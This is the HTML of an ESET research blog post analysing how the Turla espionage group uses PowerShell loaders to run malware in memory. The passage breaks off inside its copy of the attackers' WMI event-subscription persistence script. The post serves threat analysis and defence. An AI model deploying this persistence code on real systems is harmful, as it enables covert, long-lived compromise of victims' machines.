<!doctype html>
<html lang="en-US" prefix="og: http://ogp.me/ns#">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <meta name="google-site-verification" content="_b2avZwzr79oru6lM2Ddae1fNpSIbPaP0H0WNkc2x3k"/>
    <meta name="msvalidate.01" content="CE77828A466C2513F660017CFCB6BA13"/>
    <link rel="icon" href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/favicon.ico">

    

            
    
    <link href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/build/css/main-8633bd3c28.css" rel="stylesheet">
    <script type="text/javascript"> var appInsights=window.appInsights||function(a){ function b(a){c[a]=function(){var b=arguments;c.queue.push(function(){c[a].apply(c,b)})}}var c={config:a},d=document,e=window;setTimeout(function(){var b=d.createElement("script");b.src=a.url||"https://az416426.vo.msecnd.net/scripts/a/ai.0.js",d.getElementsByTagName("script")[0].parentNode.appendChild(b)});try{c.cookie=d.cookie}catch(a){}c.queue=[];for(var f=["Event","Exception","Metric","PageView","Trace","Dependency"];f.length;)b("track"+f.pop());if(b("setAuthenticatedUserContext"),b("clearAuthenticatedUserContext"),b("startTrackEvent"),b("stopTrackEvent"),b("startTrackPage"),b("stopTrackPage"),b("flush"),!a.disableExceptionTracking){f="onerror",b("_"+f);var g=e[f];e[f]=function(a,b,d,e,h){var i=g&&g(a,b,d,e,h);return!0!==i&&c["_"+f](a,b,d,e,h),i}}return c }({ instrumentationKey:"dcb460fe-684e-4d39-bfcd-d3a6f2710a32" }); window.appInsights=appInsights,appInsights.queue&&0===appInsights.queue.length&&appInsights.trackPageView(); </script>
    <script>
        window.dataLayer = window.dataLayer || [];
    window.dataLayer.push({
        'Author': 'Matthieu Faou',
        'ArticleCategory': 'Malware',
        'ArticleSection': 'Research',
        'cookie-bar-hq': true
    });

    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
        new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
        'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-PMDGSM');
</script>
<script>(function() {
  var _fbq = window._fbq || (window._fbq = []);
  if (!_fbq.loaded) {
    var fbds = document.createElement('script');
    fbds.async = true;
    fbds.src = '//connect.facebook.net/en_US/fbds.js';
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(fbds, s);
    _fbq.loaded = true;
  }
  _fbq.push(['addPixelId', '1518099328403839']);
})();
window._fbq = window._fbq || [];
window._fbq.push(['track', 'PixelInitialized', {}]);
</script>
<noscript><img height="1" width="1" alt="" style="display:none" src="https://www.facebook.com/tr?id=1518099328403839&amp;ev=NoScript" /></noscript>
<meta property="fb:pages" content="56844830907" />
<!-- This site is optimized with the Yoast SEO plugin v9.2 - https://yoast.com/wordpress/plugins/seo/ -->
<title>A dive into Turla PowerShell usage | WeLiveSecurity</title>
<meta name="description" content="ESET researchers show how, in a bid to evade detection, the Turla group leverages PowerShell scripts to inject malware directly into memory."/>
<link rel="canonical" href="https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/" />
<meta property="og:locale" content="en_US" />
<meta property="og:locale:alternate" content="fr_FR" />
<meta property="og:locale:alternate" content="de_DE" />
<meta property="og:type" content="article" />
<meta property="og:title" content="A dive into Turla PowerShell usage | WeLiveSecurity" />
<meta property="og:description" content="ESET researchers show how, in a bid to evade detection, the Turla group leverages PowerShell scripts to inject malware directly into memory." />
<meta property="og:url" content="https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/" />
<meta property="og:site_name" content="WeLiveSecurity" />
<meta property="article:section" content="Malware" />
<meta property="article:published_time" content="2019-05-29T09:30:29+00:00" />
<meta property="article:modified_time" content="2019-06-19T03:49:03+00:00" />
<meta property="og:updated_time" content="2019-06-19T03:49:03+00:00" />
<meta property="og:image" content="https://www.welivesecurity.com/wp-content/uploads/2019/05/shutterstock_154547867-3.jpg" />
<meta property="og:image:secure_url" content="https://www.welivesecurity.com/wp-content/uploads/2019/05/shutterstock_154547867-3.jpg" />
<meta property="og:image:width" content="1000" />
<meta property="og:image:height" content="750" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:description" content="ESET researchers show how, in a bid to evade detection, the Turla group leverages PowerShell scripts to inject malware directly into memory." />
<meta name="twitter:title" content="A dive into Turla PowerShell usage | WeLiveSecurity" />
<meta name="twitter:site" content="@welivesecurity" />
<meta name="twitter:image" content="https://www.welivesecurity.com/wp-content/uploads/2019/05/shutterstock_154547867-3.jpg" />
<meta name="twitter:creator" content="@matthieu_faou" />
<!-- / Yoast SEO plugin. -->

<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://www.welivesecurity.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://www.welivesecurity.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel="alternate" href="https://www.welivesecurity.com/fr/2019/05/29/plongeon-univers-turla-powershell/" hreflang="fr" />
<link rel="alternate" href="https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/" hreflang="en" />
<link rel="alternate" href="https://www.welivesecurity.com/la-es/2019/05/31/analisis-como-utiliza-powershell-grupo-turla/" hreflang="es" />
<link rel="alternate" href="https://www.welivesecurity.com/deutsch/2019/05/29/eset-einblick-turla-powershell/" hreflang="de" />
<link rel="alternate" type="application/rss+xml" title="WeLiveSecurity RSS 2.0 Feed" href="/rss-configurator/" /><style type="text/css" id="syntaxhighlighteranchor"></style>
        <link id="cookie-style" rel="stylesheet" type="text/css" href="https://assets.esetstatic.com/3PS/cookiebar.min.css">
</head>
<body class="no-js single wide">
<noscript>
	<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PMDGSM" height="0" width="0" style="display:none;visibility:hidden"></iframe>
</noscript>
<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.3";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
<div class="main">
    <header id="site-header" class="container">
        <div class="row">
            <div class="col-md-4 col-sm-12 col-xs-12 pull-right" id="header-nav">
                <div class="row">
                    <div class="col-xs-12 mobile-search-input">
                        <form action="https://www.welivesecurity.com/" class="basic-searchform imc dark col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                    </div>
                    <div class="hidden-lg hidden-md col-sm-7 col-xs-8 hidden-xxs">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
                    <div class="col-md-8 hidden-sm hidden-xs languages">
                        <div class="dropdown">
	<button class="btn btn-default dropdown-toggle" type="button" id="main-language-picker" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
    	<span class="text">In English</span>
    	<span class="icomoon icon-icon_arrow"></span>
  	</button>
  	<ul class="dropdown-menu" aria-labelledby="main-language-picker">
            <li>
        <a href="/br/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/2019/05/29/plongeon-univers-turla-powershell/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/2019/05/31/analisis-como-utiliza-powershell-grupo-turla/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/2019/05/29/eset-einblick-turla-powershell/" title="In Deutsch">
            In Deutsch        </a>
    </li>
      	</ul>
</div>                    </div>
                    <div class="col-md-4 col-sm-2 col-xs-3 menu-trigger">
                        <div class="menu-btn">
	<span class="text">Menu</span>
	<button type="button" id="menu-trigger" class="tcon tcon-menu--xcross" aria-label="toggle menu">
        <span class="wrapper">
            <span class="tcon-menu__lines" aria-hidden="true"></span>
            <span class="tcon-visuallyhidden">toggle menu</span>
        </span>
    </button>
</div>                    </div>
                    <div class="hidden-lg hidden-md hidden-sm hidden-xs col-xs-2 mobile-search imc">
                        <button class="imc">
                            <span class="icomoon icon-icon_search imc"></span>
                        </button>
                    </div>
                    <div class="col-md-12 col-sm-12 col-xs-12 imc" id="main-menu">
                        <nav class="menu clearfix imc">
                            <ul class="col-md-12 col-sm-6 col-xs-6 imc">
                                                                    <li class="">
                                        <a href="/">
                                            All Posts                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/research">
                                            Research                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/category/how-to/">
                                            How To                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/media/videos/">
                                            Videos                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/media/podcasts/">
                                            Podcasts                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/conference-papers/">
                                            Conference Materials                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/white-papers/">
                                            White Papers                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/threat-reports/">
                                            Threat Reports                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/magazine/">
                                            Magazine                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/our-experts/">
                                            Our Experts                                        </a>
                                    </li>
                                                            </ul>

                            <div class="col-md-12 col-sm-6 col-xs-6 imc">
                                <ul class="languages hidden-lg hidden-md hidden-xxs col-xs-12 imc">
                                        <li>
        <a href="/br/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/2019/05/29/plongeon-univers-turla-powershell/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/2019/05/31/analisis-como-utiliza-powershell-grupo-turla/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/2019/05/29/eset-einblick-turla-powershell/" title="In Deutsch">
            In Deutsch        </a>
    </li>
                                    </ul>
                                <div class="hidden-lg hidden-md col-xs-12 imc">
                                    <form action="https://www.welivesecurity.com/" class="basic-searchform imc dark col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                                </div>
                            </div>
                        </nav>
                    </div>
                    <div class="menu-overlay col-md-12 col-sm-12 col-xs-12 imc">
                        <div class="inner imc"></div>
                    </div>
                </div>
                <div class="row hidden-sm hidden-xs">
                    <form action="https://www.welivesecurity.com/" class="basic-searchform imc  col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                </div>
            </div>
            <div class="col-md-5 hidden-sm hidden-xs pull-left" id="header-logo">
                <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                <span class="slogan hidden-sm hidden-xs">
						Award-winning news, views, and insight from the ESET <strong>security community</strong> 
					</span>
            </div>
        </div>
    </header>
        <section id="article-detail">
            <div class="hero-wide" style="background-image: url('../../../../wp-content/uploads/2019/05/shutterstock_154547867-1.jpg'); background-position: 50% 50%;">
    <div class="text-wrapper">
        <div class="container promo-text">
            <div class="col-md-11 col-sm-11 col-xs-12 no-padding">
                <h1>A dive into Turla PowerShell usage</h1>
<div class="excerpt">ESET researchers analyze new TTPs attributed to the Turla group that leverage PowerShell to run malware in-memory only</div>
<div class="post-meta">
    <div class="wls-authors">
                <div class="wls-author with-avatar">
                            <div class="wls-author-avatar">
                    <a href="https://www.welivesecurity.com/author/mfaou/" title="Matthieu Faou">
                        <img src="https://www.welivesecurity.com/wp-content/uploads/2021/02/Matthieu-Faou-222x179.jpg" alt="Matthieu Faou">
                    </a>
                </div>
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/mfaou/" title="Matthieu Faou">
                    Matthieu Faou                </a>
            </div>
        </div>
                <div class="wls-author with-avatar">
                            <div class="wls-author-avatar">
                    <a href="https://www.welivesecurity.com/author/romaindupont/" title="Romain Dumont">
                        <img src="https://www.welivesecurity.com/wp-content/uploads/2018/03/20180322_114641-5-222x179.jpg" alt="Romain Dumont">
                    </a>
                </div>
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/romaindupont/" title="Romain Dumont">
                    Romain Dumont                </a>
            </div>
        </div>
            </div>
    <span class="meta">
		<span class="strong">
			<time datetime="2019-05-29 11:30:29">29 May 2019 - 11:30AM</time>
		</span>
			</span>
</div>
            </div>
        </div>
    </div>
</div>

            <div class="content">
                <div class="social-wrapper" id="social-sharer">
                    <span class="text">Share</span>
	<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2019%2F05%2F29%2Fturla-powershell-usage%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
		<span class="icomoon icon-icon_fb"></span>
	</a>
	<a class="share-twitter" href="https://twitter.com/intent/tweet?&url=https%3A%2F%2Fwww.welivesecurity.com%2F2019%2F05%2F29%2Fturla-powershell-usage%2F&text=A dive into Turla PowerShell usage%0A&via=welivesecurity" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
		<span class="icomoon icon-icon_tw"></span>
	</a>
	<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2019%2F05%2F29%2Fturla-powershell-usage%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
		<span class="icomoon icon-icon_in"></span>
	</a>
                </div>
                <div class="container">
                    <div class="row">
                        <div class="col-md-1 col-sm-1 hidden-xs">

                        </div>
                        <div class="col-md-10 col-sm-10 col-xs-12 formatted">

                            <div class="excerpt wide">
                                <p>ESET researchers analyze new TTPs attributed to the Turla group that leverage PowerShell to run malware in-memory only</p>
                            </div>

                            <p>Turla, also known as Snake, is an infamous espionage group recognized for its complex malware. To confound detection, its operators recently started using PowerShell scripts that provide direct, in-memory loading and execution of malware executables and libraries. This allows them to bypass detection that can trigger when a malicious executable is dropped on disk.</p>
<p>Turla is believed to have been operating since at least 2008, when it successfully breached the <a href="https://www.nytimes.com/2010/08/26/technology/26cyber.html?_r=1&amp;ref=technolog" target="_blank" rel="noopener">US military</a>. More recently, it was involved in major attacks against the <a href="https://uk.reuters.com/article/us-germany-cyber/german-government-hack-was-part-of-worldwide-campaign-sources-idUKKCN1GE2H5" target="_blank" rel="noopener">German Foreign Office</a> and the <a href="https://www.lemonde.fr/international/article/2019/01/18/armees-la-france-prepare-ses-cyberoffensives_5410983_3210.html" target="_blank" rel="noopener">French military</a>.</p>
<p>This is not the first time Turla has used PowerShell in-memory loaders to increase its chances of bypassing security products. In 2018, Kaspersky Labs published a <a href="https://securelist.com/shedding-skin-turlas-fresh-faces/88069/" target="_blank" rel="noopener">report</a> that analyzed a Turla PowerShell loader that was based on the open-source project <a href="https://github.com/darkoperator/Posh-SecMod" target="_blank" rel="noopener">Posh-SecMod</a>. However, it was quite buggy and often led to crashes.</p>
<p>After a few months, Turla has improved these scripts and is now using them to load a wide range of custom malware from its traditional arsenal.</p>
<p>The victims are quite usual for Turla. We identified several diplomatic entities in Eastern Europe that were compromised using these scripts. However, it is likely the same scripts are used more globally against many traditional Turla targets in Western Europe and the Middle East. Thus, this blogpost aims to help defenders counter these PowerShell scripts. We will also present various payloads, including an RPC-based backdoor and a backdoor leveraging OneDrive as its Command and Control (C&amp;C) server.</p>
<h1><strong>PowerShell Loader</strong></h1>
<p>The PowerShell loader has three main steps: persistence, decryption and loading into memory of the embedded executable or library.</p>
<h2>Persistence</h2>
<p>The PowerShell scripts are not simple droppers; they persist on the system as they regularly load into memory only the embedded executables. We have seen Turla operators use two persistence methods:</p>
<ul>
<li>A Windows Management Instrumentation (WMI) event subscription</li>
<li>Alteration of the PowerShell profile (<span style="font-family: courier new, courier, monospace;">profile.ps1</span> file).</li>
</ul>
<h3>Windows Management Instrumentation</h3>
<p>In the first case, attackers create two WMI<em> event filters </em>and two WMI <em>event consumers</em>. The consumers are simply command lines launching base64-encoded PowerShell commands that load a large PowerShell script stored in the Windows registry. Figure 1 shows how the persistence is established.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a99b2e3e563713800678" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='Syslog Consumer'" | Remove-WmiObject; 
$NLP35gh = Set-WmiInstance -Namespace "root\subscription" -Class 'CommandLineEventConsumer' -Arguments @{name='Syslog Consumer';CommandLineTemplate="$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -enc $HL39fjh";RunInteractively='false'};


Get-WmiObject __eventFilter -namespace root\subscription -filter "name='Log Adapter Filter'"| Remove-WmiObject; 
Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {$_.filter -match 'Log Adapter'} | Remove-WmiObject;
$IT825cd = "SELECT * FROM __instanceModificationEvent WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour=15 AND TargetInstance.Minute=30 AND TargetInstance.Second=40";
$VQI79dcf = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{name='Log Adapter Filter';EventNameSpace='root\CimV2';QueryLanguage='WQL';Query=$IT825cd};
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$VQI79dcf;Consumer=$NLP35gh};
 
Get-WmiObject __eventFilter -namespace root\subscription -filter "name='AD Bridge Filter'"| Remove-WmiObject; 
Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {$_.filter -match 'AD Bridge'} | Remove-WmiObject;
$IT825cd = "SELECT * FROM __instanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime &gt;= 300 AND TargetInstance.SystemUpTime &lt; 400";
$VQI79dcf = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{name='AD Bridge Filter';EventNameSpace='root\CimV2';QueryLanguage='WQL';Query=$IT825cd};
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$VQI79dcf;Consumer=$NLP35gh};</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a99b2e3e563713800678-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a99b2e3e563713800678-2">2</div><div class="crayon-num" data-line="crayon-60a99b2e3e563713800678-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a99b2e3e563713800678-4">4</div><div class="crayon-num" data-line="crayon-60a99b2e3e563713800678-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a99b2e3e563713800678-6">6</div><div class="crayon-num" data-line="crayon-60a99b2e3e563713800678-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a99b2e3e563713800678-8">8</div><div class="crayon-num" data-line="crayon-60a99b2e3e563713800678-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a99b2e3e563713800678-10">10</div><div class="crayon-num" data-line="crayon-60a99b2e3e563713800678-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a99b2e3e563713800678-12">12</div><div class="crayon-num" data-line="crayon-60a99b2e3e563713800678-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a99b2e3e563713800678-14">14</div><div class="crayon-num" data-line="crayon-60a99b2e3e563713800678-15">15</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a99b2e3e563713800678-1"><span class="crayon-v">Get</span><span class="crayon-o">-</span><span class="crayon-e">WmiObject </span><span class="crayon-v">CommandLineEventConsumer</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-t">Namespace</span><span class="crayon-h"> </span><span class="crayon-v">root</span><span class="crayon-sy">\</span><span class="crayon-v">subscription</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">filter</span><span class="crayon-h"> </span><span class="crayon-s">"name='Syslog Consumer'"</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">Remove</span><span class="crayon-o">-</span><span class="crayon-v">WmiObject</span><span class="crayon-sy">;</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-60a99b2e3e563713800678-2"><span class="crayon-sy">$</span><span class="crayon-v">NLP35gh</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">Set</span><span class="crayon-o">-</span><span class="crayon-v">WmiInstance</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-t">Namespace</span><span class="crayon-h"> </span><span class="crayon-s">"root\subscription"</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-t">Class</span><span class="crayon-h"> </span><span class="crayon-s">'CommandLineEventConsumer'</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">Arguments</span><span class="crayon-h"> </span><span class="crayon-sy">@</span><span class="crayon-sy">{</span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">'Syslog Consumer'</span><span class="crayon-sy">;</span><span class="crayon-v">CommandLineTemplate</span><span class="crayon-o">=</span><span class="crayon-s">"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -enc $HL39fjh"</span><span class="crayon-sy">;</span><span class="crayon-v">RunInteractively</span><span class="crayon-o">=</span><span class="crayon-s">'false'</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a99b2e3e563713800678-3">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60a99b2e3e563713800678-4">&nbsp;</div><div class="crayon-line" id="crayon-60a99b2e3e563713800678-5"><span class="crayon-v">Get</span><span class="crayon-o">-</span><span class="crayon-e">WmiObject </span><span class="crayon-v">__eventFilter</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-t">namespace</span><span class="crayon-h"> </span><span class="crayon-v">root</span><span class="crayon-sy">\</span><span class="crayon-v">subscription</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">filter</span><span class="crayon-h"> </span><span class="crayon-s">"name='Log Adapter Filter'"</span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">Remove</span><span class="crayon-o">-</span><span class="crayon-v">WmiObject</span><span class="crayon-sy">;</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-60a99b2e3e563713800678-6"><span class="crayon-v">Get</span><span class="crayon-o">-</span><span class="crayon-e">WmiObject </span><span class="crayon-v">__FilterToConsumerBinding</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-t">Namespace</span><span class="crayon-h"> </span><span class="crayon-v">root</span><span class="crayon-sy">\</span><span class="crayon-v">subscription</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-e">Where</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">_</span><span class="crayon-sy">.</span><span class="crayon-v">filter</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">match</span><span class="crayon-h"> </span><span class="crayon-s">'Log Adapter'</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">Remove</span><span class="crayon-o">-</span><span class="crayon-v">WmiObject</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a99b2e3e563713800678-7"><span class="crayon-sy">$</span><span class="crayon-v">IT825cd</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"SELECT * FROM __instanceModificationEvent WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour=15 AND TargetInstance.Minute=30 AND TargetInstance.Second=40"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a99b2e3e563713800678-8"><span class="crayon-sy">$</span><span class="crayon-v">VQI79dcf</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">Set</span><span class="crayon-o">-</span><span class="crayon-e">WmiInstance</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-t">Class</span><span class="crayon-h"> </span><span class="crayon-e">__EventFilter</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-t">Namespace</span><span class="crayon-h"> </span><span class="crayon-e">root</span><span class="crayon-sy">\</span><span class="crayon-e">subscription</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">Arguments</span><span class="crayon-h"> </span><span class="crayon-sy">@</span><span class="crayon-sy">{</span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">'Log Adapter Filter'</span><span class="crayon-sy">;</span><span class="crayon-v">EventNameSpace</span><span class="crayon-o">=</span><span class="crayon-s">'root\CimV2'</span><span class="crayon-sy">;</span><span class="crayon-v">QueryLanguage</span><span class="crayon-o">=</span><span class="crayon-s">'WQL'</span><span class="crayon-sy">;</span><span class="crayon-v">Query</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">IT825cd</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a99b2e3e563713800678-9"><span class="crayon-e">Set</span><span class="crayon-o">-</span><span class="crayon-e">WmiInstance</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-t">Namespace</span><span class="crayon-h"> </span><span class="crayon-e">root</span><span class="crayon-sy">\</span><span class="crayon-e">subscription</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-t">Class</span><span class="crayon-h"> </span><span class="crayon-e">__FilterToConsumerBinding</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">Arguments</span><span class="crayon-h"> </span><span class="crayon-sy">@</span><span 